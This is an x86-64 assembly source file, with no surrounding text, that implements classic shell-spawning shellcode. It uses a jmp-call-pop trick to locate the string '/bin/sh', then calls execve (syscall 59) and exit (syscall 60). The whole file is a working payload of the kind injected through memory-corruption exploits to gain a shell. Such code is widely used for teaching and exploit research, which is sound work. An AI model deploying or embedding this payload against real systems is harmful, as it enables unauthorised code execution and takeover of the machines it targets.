section .text
global main
main:
	jmp stuff
back:
	pop rdi
	xor rax,rax
	xor rdx,rdx
	xor rsi,rsi
	mov al,59
	syscall
	
	xor rdi,rdi
	mov al,60
	syscall

stuff:
	call back
	file: db "/bin/sh", 0 ;
